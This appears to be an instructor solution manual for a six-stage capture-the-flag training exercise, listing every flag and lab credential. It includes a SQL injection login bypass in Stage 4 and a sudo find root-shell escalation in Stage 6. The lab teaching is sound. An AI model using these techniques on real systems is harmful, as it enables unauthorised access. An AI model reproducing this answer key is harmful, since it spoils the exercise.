# Instructor Solution Manual & Player Walkthrough

## Stage 1: The Digital Footprint (OSINT)
1. Navigate to `http://<TARGET_IP>/index.html`.
2. Click on the **About Us / Team Roster** link (`team.html`).
3. Download or inspect `employee.jpg`.
4. Run:
   ```bash
   exiftool employee.jpg
   ```
   Notice the Comment and Description fields:
   `User Comment: NH{exif_m3t4d4t4_tr4ck3d}`
   `Artist: m.vance@nexacore.local`

---

## Stage 2: The Hidden Message (Steganography)
1. On the homepage, save the defacement image `trophy.png`.
2. Run LSB analysis or the provided Python extraction script:
   ```bash
   python3 extract_lsb.py trophy.png
   ```
   Or using zsteg:
   ```bash
   zsteg -a trophy.png
   ```
3. The extracted payload yields:
   ```
   NH{st3g0_gh0st_unh1dd3n}
   Next Clue: Intercepted internal GhostByte C2 chat log.
   Keyphrase: ghostbyte123
   ```

---

## Stage 3: Encrypted Correspondence (Cryptography)
1. Open `chat_log.txt`. Notice the Base64 ciphertext block.
2. In CyberChef or Python:
   - Step 1: Base64 Decode
   - Step 2: Vigenère Decode with key `PROMETHEUS` (derived from the stolen project name).
3. Plaintext output:
   ```
   Ghost01: Shadow-IT admin portal active at http://<TARGET_HOST>:8080/
   Ghost02: Confirmed. Fallback root credentials set to 'admin' / 'GhostOpsPass2026!'.
   Ghost01: SQL injection bypass is also open on the user parameter if you lose password.
   Ghost02: Flag verification token: NH{v1g3n3r3_c1ph3r_cr4ck3d}
   Ghost01: Do not share this key with the mole.
   ```

---

## Stage 4: The Backdoor Portal (Web Security)
1. Open browser to `http://<TARGET_HOST>:8080/`.
2. Method A (Credential Reuse): Log in with `admin` and `GhostOpsPass2026!`.
3. Method B (SQL Injection):
   - Username: `' OR 1=1#`
   - Password: `any_password`
4. The dashboard displays the status and flag:
   `NH{sqli_4dm1n_p0rt4l_byp4ss}`

---

## Stage 5: Tracing the Exfiltration (Forensics & Networking)
1. Open `exfil.pcap` in Wireshark or run strings:
   ```bash
   strings exfil.pcap | grep "NH{"
   ```
   Reveals Sub-flag 1: `NH{pcap_ftp_tr4ff1c`
2. Carve deleted strings from `disk.img`:
   ```bash
   strings disk.img | grep "SUBFLAG_2"
   ```
   Reveals Sub-flag 2: `_4nd_d1sk_r3c0v3ry}`
3. Concatenate the two halves:
   `NH{pcap_ftp_tr4ff1c_4nd_d1sk_r3c0v3ry}`
4. Reviewing the deleted log also reveals the SSH login credentials for Stage 6:
   `Host: Port 2222 | User: runner | Password: nighthawk_guest`

---

## Stage 6: The Prometheus Vault (Capstone)
1. Connect via SSH:
   ```bash
   ssh -p 2222 runner@<TARGET_IP>
   # Password: nighthawk_guest
   ```
2. Check available sudo permissions:
   ```bash
   sudo -l
   ```
   Notice: `(ALL) NOPASSWD: /usr/bin/find`
3. Elevate privileges using GTFOBins syntax:
   ```bash
   sudo find . -exec /bin/sh \; -quit
   ```
4. As root, inspect `/opt/vault/`:
   ```bash
   cd /opt/vault
   ls -la
   ```
   Files found: `vault_lock` (ELF 64-bit binary) and `vault.enc` (encrypted data).
5. Reverse engineer or execute the binary:
   ```bash
   objdump -d vault_lock | grep xor
   # Or directly execute:
   ./vault_lock vault.enc
   ```
6. The terminal outputs:
   ```
   NH{pr0m3th3us_c0r3_s4f3gu4rd3d}
   Incident Status: THREAT NEUTRALIZED. INSIDER EXPOSED.
   ```
